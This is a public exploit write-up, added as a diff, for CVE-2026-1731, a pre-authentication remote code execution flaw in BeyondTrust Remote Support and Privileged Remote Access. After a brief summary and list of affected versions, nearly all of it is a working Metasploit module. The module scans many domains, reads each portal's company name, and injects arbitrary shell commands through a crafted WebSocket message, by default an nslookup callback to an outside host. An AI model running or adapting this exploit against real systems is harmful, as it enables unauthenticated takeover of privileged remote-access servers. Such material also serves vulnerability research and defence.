@@ -1,0 +1,254 @@
+=============================================================================================================================================
+| # Title     : BeyondTrust Remote Support / Privileged Remote Access – Pre‑Authentication Remote Code Execution                            |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.3 (64 bits)                                                            |
+| # Vendor    : https://www.beyondtrust.com/                                                                                                |
+=============================================================================================================================================
+
+[+] Summary    : A critical pre‑authentication Remote Code Execution (RCE) vulnerability identified as CVE-2026-1731 affects products from BeyondTrust, specifically Remote Support and Privileged Remote Access.
+                 The vulnerability allows an unauthenticated attacker to execute arbitrary commands on a vulnerable system by abusing a specially 
+				 crafted WebSocket connection. The issue stems from improper input validation and unsafe handling of user-controlled data during the WebSocket communication process.
+
+[+] Affected Versions :
+
+The vulnerability affects the following versions of BeyondTrust products: Remote Support (RS)
+
+Affected versions: 25.3.1 and earlier This means any device running these versions prior to 25.3.2 is vulnerable. Privileged Remote Access (PRA)
+
+Affected versions: 24.3.4 and earlier Any PRA plan running version 24.3.4 or earlier is vulnerable to this vulnerability.
+
+[+] POC : 
+
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Scanner
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'BeyondTrust Remote Support/Privileged Remote Access Pre-auth RCE',
+        'Description' => %q{
+          This module exploits CVE-2026-1731, a pre-authentication remote code execution
+          vulnerability in BeyondTrust Remote Support and Privileged Remote Access.
+          The vulnerability allows unauthenticated attackers to execute arbitrary commands
+          on the target system through a specially crafted WebSocket connection.
+        },
+        'Author' => [
+          'Bipin Jitiya (@win3zz)', # Original Python script
+          'indoushka' # Metasploit module author
+        ],
+        'References' => [
+          ['CVE', '2026-1731'],
+          ['URL', 'https://attackerkb.com/topics/jNMBccstay/cve-2026-1731/rapid7-analysis'],
+          ['URL', 'https://github.com/win3zz/CVE-2026-1731'] # Assuming GitHub repo exists
+        ],
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [REPEATABLE_SESSION],
+          'SideEffects' => [IOC_IN_LOGS]
+        }
+      )
+    )
+
+    register_options(
+      [
+        Opt::RPORT(443),
+        OptBool.new('SSL', [true, 'Use SSL', true]),
+        OptString.new('TARGETURI', [true, 'The base path to the BeyondTrust application', '/']),
+        OptString.new('CMD', [true, 'The command to execute', 'nslookup {{callback}}']),
+        OptString.new('CALLBACK_DOMAIN', [false, 'Callback domain for nslookup (replaces {{callback}} in CMD)', '']),
+        OptPath.new('DOMAINS_FILE', [false, 'File containing list of domains to scan']),
+        OptBool.new('VERBOSE_OUTPUT', [false, 'Enable verbose output', false])
+      ]
+    )
+
+    register_advanced_options(
+      [
+        OptInt.new('WEBSOCKET_TIMEOUT', [true, 'WebSocket connection timeout in milliseconds', 5000])
+      ]
+    )
+  end
+
+  def verbose_print(msg)
+    print_status(msg) if datastore['VERBOSE_OUTPUT']
+  end
+
+  def run_host(_ip)
+
+    if datastore['DOMAINS_FILE'] && File.exist?(datastore['DOMAINS_FILE'])
+      File.readlines(datastore['DOMAINS_FILE']).each do |domain|
+        domain = domain.strip
+        next if domain.empty?
+
+        check_and_exploit_domain(domain)
+      end
+    else
+
+      check_and_exploit_domain(rhost)
+    end
+  end
+
+  def check_and_exploit_domain(domain)
+    print_status("Checking #{domain}")
+
+    company = fetch_company_info(domain)
+    return unless company
+
+    print_good("Found company: #{company}")
+
+    execute_websocket_attack(domain, company)
+  end
+
+  def fetch_company_info(domain)
+
+    ['http', 'https'].each do |proto|
+      uri = "#{proto}://#{domain}/get_portal_info"
+      verbose_print("Checking: #{uri}")
+
+      begin
+        res = send_request_cgi(
+          'uri' => '/get_portal_info',
+          'method' => 'GET',
+          'rhost' => domain,
+          'rport' => datastore['RPORT'],
+          'ssl' => (proto == 'https')
+        )
+
+        if res && res.code == 200
+          verbose_print("Raw response: #{res.body}")
+
+          if res.body =~ /company=([^;]+)/
+            company = Regexp.last_match(1).strip
+            return company
+          end
+        end
+      rescue Rex::ConnectionError, Rex::TimeoutError => e
+        verbose_print("Error connecting to #{domain}: #{e.message}")
+      end
+    end
+
+    print_status("No portal info or company found for #{domain}")
+    nil
+  end
+
+  def prepare_command
+    cmd = datastore['CMD']
+
+    if datastore['CALLBACK_DOMAIN'] && !datastore['CALLBACK_DOMAIN'].empty?
+      cmd.gsub!('{{callback}}', datastore['CALLBACK_DOMAIN'])
+    end
+
+    if cmd.include?('{{callback}}')
+      random_callback = "#{Rex::Text.rand_text_alphanumeric(8)}.oast.fun"
+      cmd.gsub!('{{callback}}', random_callback)
+      print_warning("Using random callback domain: #{random_callback}")
+    end
+
+    cmd
+  end
+
+  def execute_websocket_attack(domain, company)
+    print_status("Running WebSocket action for #{domain}")
+
+    cmd = prepare_command
+    verbose_print("Using command: #{cmd}")
+
+    uuid = 'aaaaaaaa-aaaa-aaaa-aaaaaaaaaaaa'
+    random_id = Rex::Text.rand_text_alphanumeric(4)
+    payload = "hax[$(#{cmd})]\n#{uuid}\n0\n#{random_id}\n"
+
+    verbose_print("WebSocket payload: #{payload.inspect}")
+
+    ws_uri = "wss://#{domain}:#{datastore['RPORT']}/nw"
+
+    begin
+
+      ws = connect_ws(
+        ws_uri,
+        'protocol' => 'ingredi support desk customer thin',
+        'headers' => {
+          'X-Ns-Company' => company
+        }
+      )
+
+      if ws.nil?
+        print_error("Failed to establish WebSocket connection to #{domain}")
+        return
+      end
+
+      print_status("WebSocket connection established to #{domain}")
+
+      ws.put(payload)
+
+      timeout = datastore['WEBSOCKET_TIMEOUT'] / 1000.0
+      begin
+        Timeout.timeout(timeout) do
+          while (response = ws.get)
+            print_line(response.to_s) unless response.to_s.empty?
+          end
+        end
+      rescue Timeout::Error
+        verbose_print("WebSocket read timeout")
+      end
+
+    rescue Rex::ConnectionError => e
+      print_error("WebSocket connection error: #{e.message}")
+    rescue StandardError => e
+      print_error("Error during WebSocket attack: #{e.message}")
+      verbose_print("Error details: #{e.backtrace.join("\n")}")
+    ensure
+      ws.close if ws
+    end
+  end
+
+  def connect_ws(uri, opts = {})
+    require 'rex/proto/http/web_socket'
+
+    begin
+
+      u = URI.parse(uri)
+
+      host = u.host
+      port = u.port
+
+      http_client = Rex::Proto::Http::Client.new(
+        host,
+        port,
+        {},
+        u.scheme == 'wss'
+      )
+
+      request = http_client.request_websocket_upgrade(
+        u.path,
+        opts[:protocol]
+      )
+
+      opts[:headers]&.each do |key, value|
+        request[key] = value
+      end
+      response = http_client.send_recv(request)
+
+      if response && response.code == 101 # Switching Protocols
+        return Rex::Proto::Http::WebSocket.new(http_client, response)
+      else
+        vprint_error("WebSocket upgrade failed: #{response.code}") if response
+        return nil
+      end
+
+    rescue StandardError => e
+      vprint_error("WebSocket connection error: #{e.message}")
+      nil
+    end
+  end
+end
+	
+Greetings to :======================================================================
+jericho * Larry W. Cashdollar * r00t * Hussin-X * Malvuln (John Page aka hyp3rlinx)|
+====================================================================================
